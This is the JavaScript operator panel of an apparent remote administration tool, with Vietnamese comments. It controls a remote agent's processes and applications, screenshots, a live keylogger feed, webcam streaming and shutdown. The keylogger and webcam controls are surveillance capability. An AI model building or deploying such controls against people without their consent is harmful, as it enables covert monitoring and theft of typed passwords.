import { CONFIG, state } from './config.js';
import * as Utils from './utils.js';
import * as Views from './views.js';
import { startSignalR, sendCommand } from './network.js';

document.getElementById('agent-id-display').textContent = CONFIG.AGENT_ID;

// --- LOGIC XỬ LÝ KẾT QUẢ TRẢ VỀ ---

function handleResponse(data) {
    if (!data) return;

    // 1. Dữ liệu Apps
    if (state.currentView === 'applications' && Array.isArray(data.response)) {
        state.globalAppData = data.response;
        // Logic sort lại nếu đang có sort
        sortAndRenderApp();
    } 
    // 2. Dữ liệu Process
    else if (state.currentView === 'processes' && Array.isArray(data.response)) {
        state.globalProcessData = data.response;
        sortAndRenderProcess();
    }
    // 3. Phản hồi lệnh
    else if (data.response === 'stopped') {
        if(state.currentView === 'keylogger') document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
        if(state.currentView === 'applications') setTimeout(() => sendCommand('app_list'), 200);
        
        // Reset Webcam UI
        if(state.currentView === 'webcam') {
            const vid = document.getElementById('webcam-stream');
            const ph = document.getElementById('webcam-placeholder');
            const stats = document.getElementById('webcam-stats-overlay');
            if(vid) { vid.style.display = 'none'; vid.src = ""; }
            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt'; }
            if(stats) stats.style.display = 'none';
            state.webcam.currentFPS = 0;
        }
    }
    else if (data.response === 'started') {
        if(state.currentView === 'applications') setTimeout(() => sendCommand('app_list'), 500);
        if(state.currentView === 'processes') sendCommand('process_list');
    }
    else if (data.response === 'killed' && state.currentView === 'processes') {
        sendCommand('process_list');
    }
    else if (data.response === 'done' || data.response === 'ok') {
        Utils.showModal("Thông báo", "Thao tác thành công.", null, true);
    }
}

function handleRealtimeUpdate(data) {
    if (state.currentView === 'keylogger' && data.event === 'key_pressed') {
        const logArea = document.getElementById('keylogger-log');
        if (logArea) {
            logArea.value += data.data;
            logArea.scrollTop = logArea.scrollHeight;
        }
    }
}

function handleBinaryStream(data, frameSize = 0, senderTicks = 0) {
    const view = state.currentView;
    const nowRealTime = Date.now();
    const nowPerf = performance.now();

    // Xử lý Screenshot
    if (view === 'screenshot' && state.screenshotPending && data.startsWith("data:")) {
        const img = document.getElementById('screenshot-image');
        const ph = document.getElementById('screenshot-placeholder');
        img.src = data;
        img.style.display = 'block';
        ph.style.display = 'none';
        document.getElementById('save-screenshot-btn').classList.remove('hidden');
        state.screenshotPending = false;
        Utils.updateStatus("Đã nhận ảnh.", 'success');
    }

    // Xử lý Webcam
    if (view === 'webcam' && data.startsWith("data:image")) {
        // Tính toán logic FPS/Ping
        const cam = state.webcam;
        const ticksToMicrotime = (senderTicks - 621355968000000000) / 10000;
        const sentTime = (new Date(senderTicks / 10000 + Date.UTC(0, 0, 1))).getTime();
        cam.currentPing = Math.max(0, nowRealTime - ticksToMicrotime);
        
        cam.framesReceived++;
        cam.totalDataReceived += frameSize;
        cam.currentFrameSize = frameSize;

        if (nowPerf - cam.lastSampleTime >= CONFIG.SAMPLE_INTERVAL_MS) {
            cam.totalTimeElapsed = nowPerf - cam.lastSampleTime;
            cam.currentFPS = cam.framesReceived / (cam.totalTimeElapsed / 1000);
            updateWebcamStatsDisplay();
            cam.framesReceived = 0;
            cam.lastSampleTime = nowPerf;
        }
        
        cam.lastFrameTime = nowPerf;
        updateWebcamStatsDisplay();

        // Render ảnh
        const video = document.getElementById('webcam-stream');
        const placeholder = document.getElementById('webcam-placeholder');
        if (video && data.length > 100) { 
            if (placeholder) placeholder.style.display = 'none';
            video.style.display = 'block';
            video.src = data;
        }
    }
}

// --- LOGIC HELPER RIÊNG BIỆT ---

function updateWebcamStatsDisplay() {
    const overlay = document.getElementById('webcam-stats-overlay');
    if (!overlay) return;
    
    if (state.webcam.isStatsVisible) {
        const bitrateKBps = (state.webcam.currentFrameSize / 1024) * state.webcam.currentFPS;
        overlay.innerHTML = `
            <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
                <p>FPS: <span class="font-bold text-green-400">${state.webcam.currentFPS.toFixed(1)}</span></p>
                <p>Ping: <span class="font-bold text-yellow-400">${state.webcam.currentPing.toFixed(0)} ms</span></p>
                <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
                <p>Size: <span class="font-bold text-slate-300">${(state.webcam.currentFrameSize / 1024).toFixed(1)} KB</span></p>
            </div>`;
    } else {
        overlay.innerHTML = `<p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>`;
    }
    overlay.style.display = 'block';
}

// --- LOGIC SẮP XẾP ---

// Export ra window để HTML gọi được (onclick)
window.handleSortProcess = (column) => {
    if (state.currentSort.column === column) {
        state.currentSort.direction = state.currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentSort.column = column;
        state.currentSort.direction = (column === 'name') ? 'asc' : 'desc';
    }
    // Render lại layout Header để cập nhật icon
    const tableContainer = document.querySelector('.table-container');
    if(tableContainer) {
       // Cách tối ưu: Chỉ update nội dung và header, nhưng để đơn giản ta gọi render lại
       // Trong thực tế nên tách hàm update header riêng. Ở đây ta render lại bảng.
       document.getElementById('content-area').innerHTML = Views.renderProcessLayout();
       attachViewListeners('processes'); // Re-attach event listeners
    }
    sortAndRenderProcess();
};

window.handleSortApp = (column) => {
    if (state.currentAppSort.column === column) {
        state.currentAppSort.direction = state.currentAppSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentAppSort.column = column;
        state.currentAppSort.direction = 'asc';
    }
    // Update header UI (re-render layout to simpler)
    document.getElementById('content-area').innerHTML = Views.renderAppLayout();
    attachViewListeners('applications');
    sortAndRenderApp();
};

function sortAndRenderProcess() {
    const { column, direction } = state.currentSort;
    const sorted = [...state.globalProcessData].sort((a, b) => {
        let valA, valB;
        if (column === 'pid') { valA = parseInt(a.pid); valB = parseInt(b.pid); }
        else if (column === 'name') { valA = a.name.toLowerCase(); valB = b.name.toLowerCase(); }
        else if (column === 'cpu') { valA = parseFloat(a.cpu.replace('%','')); valB = parseFloat(b.cpu.replace('%','')); }
        else { valA = parseFloat(a.mem.replace(/[^\d]/g,'')); valB = parseFloat(b.mem.replace(/[^\d]/g,'')); }
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateProcessTable(sorted);
}

function sortAndRenderApp() {
    const { column, direction } = state.currentAppSort;
    const sorted = [...state.globalAppData].sort((a, b) => {
        // Logic sort đơn giản cho App
        let valA = a[column] || '';
        let valB = b[column] || '';
        if(typeof valA === 'string') valA = valA.toLowerCase();
        if(typeof valB === 'string') valB = valB.toLowerCase();
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateAppTable(sorted);
}

// --- CONTROLLER & EVENTS ---

function switchView(view) {
    state.currentView = view;
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
        if(btn.dataset.view === view) btn.classList.add('active');
    });

    const area = document.getElementById('content-area');
    let html = '';

    switch (view) {
        case 'applications': html = Views.renderAppLayout(); setTimeout(() => sendCommand('app_list'), 100); break;
        case 'processes': html = Views.renderProcessLayout(); setTimeout(() => sendCommand('process_list'), 100); break;
        case 'screenshot': html = Views.renderScreenshotView(); break;
        case 'keylogger': html = Views.renderKeyloggerDisplay(); break;
        case 'webcam': html = Views.renderWebcamControl(); break;
        case 'system': html = Views.renderSystemControls(); break;
    }
    
    area.innerHTML = html;
    attachViewListeners(view);
}

function attachViewListeners(view) {
    if (view === 'applications') {
        document.getElementById('list-apps-btn').onclick = () => {
            document.getElementById('app-list-body').innerHTML = Utils.getLoadingRow(4);
            sendCommand('app_list');
        };
        document.getElementById('start-app-btn').onclick = () => {
            const name = document.getElementById('app-start-name').value;
            if(name) sendCommand('app_start', { name });
        };
        // Event Delegation
        document.getElementById('app-list-body').addEventListener('click', (e) => {
            const stopBtn = e.target.closest('button[data-action="stop-app"]');
            const startBtn = e.target.closest('button[data-action="start-app"]');
            if (stopBtn) {
                const name = stopBtn.dataset.name || stopBtn.dataset.id;
                Utils.showModal("Dừng App", `Dừng ứng dụng "${name}"?`, () => {
                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                    sendCommand('app_stop', { name: stopBtn.dataset.id });
                });
            }
            if (startBtn) {
                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                sendCommand('app_start', { name: startBtn.dataset.id });
            }
        });
    }
    else if (view === 'processes') {
        document.getElementById('list-processes-btn').onclick = () => {
            document.getElementById('process-list-body').innerHTML = Utils.getLoadingRow(5);
            sendCommand('process_list');
        };
        document.getElementById('start-process-btn').onclick = () => {
             // Logic mở process (ẩn) hoặc thêm modal nhập path nếu cần
             const path = prompt("Nhập đường dẫn/tên tiến trình:");
             if(path) sendCommand('process_start', { name: path });
        };
        document.getElementById('process-list-body').addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-action="kill-process"]');
            if(btn) {
                const pid = btn.dataset.id;
                Utils.showModal("Kill Process", `PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
            }
        });
        document.getElementById('process-search').addEventListener('keyup', (e) => {
            const term = e.target.value.toLowerCase();
            document.querySelectorAll('#process-list-body tr').forEach(row => {
                row.style.display = row.innerText.toLowerCase().includes(term) ? '' : 'none';
            });
        });
    }
    else if (view === 'screenshot') {
        document.getElementById('capture-screenshot-btn').onclick = () => {
            const img = document.getElementById('screenshot-image');
            img.style.display = 'none';
            document.getElementById('screenshot-placeholder').textContent = 'Đang chờ ảnh...';
            document.getElementById('screenshot-placeholder').style.display = 'block';
            document.getElementById('save-screenshot-btn').classList.add('hidden');
            state.screenshotPending = true;
            sendCommand('screenshot');
        };
        document.getElementById('save-screenshot-btn').onclick = () => {
            const src = document.getElementById('screenshot-image').src;
            if(src) {
                const link = document.createElement('a');
                link.href = src;
                link.download = `screenshot_${Date.now()}.png`;
                link.click();
            }
        };
    }
    else if (view === 'keylogger') {
        document.getElementById('start-keylogger-btn').onclick = () => {
            sendCommand('keylogger_start');
            document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
        };
        document.getElementById('stop-keylogger-btn').onclick = () => sendCommand('keylogger_stop');
        document.getElementById('clear-keylogger-btn').onclick = () => document.getElementById('keylogger-log').value = '';
    }
    else if (view === 'webcam') {
        document.getElementById('webcam-on-btn').onclick = () => {
            sendCommand('webcam_on');
            const ph = document.getElementById('webcam-placeholder');
            if(ph) ph.innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';
            updateWebcamStatsDisplay();
        };
        document.getElementById('webcam-off-btn').onclick = () => sendCommand('webcam_off');
        document.getElementById('toggle-stats-btn').onclick = () => {
            state.webcam.isStatsVisible = !state.webcam.isStatsVisible;
            const btn = document.getElementById('toggle-stats-btn');
            btn.classList.toggle('bg-blue-600', state.webcam.isStatsVisible);
            btn.classList.toggle('text-white', state.webcam.isStatsVisible);
            updateWebcamStatsDisplay();
        };
    }
    else if (view === 'system') {
        document.getElementById('shutdown-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Tắt máy Agent?", () => sendCommand('shutdown'));
        document.getElementById('restart-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Khởi động lại Agent?", () => sendCommand('restart'));
    }
}

// --- INIT ---

function doLogin(username, password) {
    const btnText = document.getElementById('btn-text');
    const btnLoader = document.getElementById('btn-loader');
    const errorMsg = document.getElementById('login-error');
    const loginBtn = document.getElementById('login-btn');

    btnText.textContent = "Đang xác thực...";
    btnLoader.classList.remove('hidden');
    errorMsg.classList.add('hidden');
    loginBtn.disabled = true;

    startSignalR(username, password, {
        onResponse: handleResponse,
        onUpdate: handleRealtimeUpdate,
        onBinary: handleBinaryStream
    })
    .then(() => {
        state.currentUser = username;
        document.getElementById('user-display').textContent = `Hi, ${username}`;
        Utils.updateStatus("Đã kết nối an toàn", "success");
        
        const loginScreen = document.getElementById('login-screen');
        const appScreen = document.getElementById('app');

        loginScreen.classList.add('opacity-0');
        setTimeout(() => {
            loginScreen.classList.add('hidden');
            appScreen.classList.remove('hidden');
            setTimeout(() => {
                appScreen.classList.remove('opacity-0');
                switchView(state.currentView);
            }, 50);
        }, 500);
    })
    .catch((err) => {
        console.warn("Login Failed:", err);
        btnText.textContent = "Đăng Nhập";
        btnLoader.classList.add('hidden');
        loginBtn.disabled = false;
        errorMsg.classList.remove('hidden');
    });
}

function doLogout() {
    if (state.connection) state.connection.stop();
    location.reload();
}

document.addEventListener('DOMContentLoaded', () => {
    // Bind Tab Click
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => switchView(e.currentTarget.dataset.view));
    });

    // Bind Login
    document.getElementById('login-form').addEventListener('submit', (e) => {
        e.preventDefault();
        doLogin(document.getElementById('username-input').value, document.getElementById('password-input').value);
    });

    // Bind Logout
    document.getElementById('logout-btn').addEventListener('click', doLogout);
});